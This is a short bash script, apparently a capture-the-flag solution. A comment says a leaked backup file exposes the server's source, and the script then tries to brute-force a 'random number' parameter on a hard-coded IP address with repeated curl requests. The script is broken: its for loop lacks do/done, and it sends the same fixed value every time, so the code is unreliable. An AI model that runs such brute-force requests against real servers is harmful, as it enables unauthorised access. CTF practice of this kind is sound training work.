#!/bin/bash

# There is a backup file accessible on the server containg the source code. (source.bak) then guess
# the random number 


url='http://141.85.224.103:8000'
for ((i=1; i<=50000; i++))
curl -s $url'/?random_numberrr=49999'
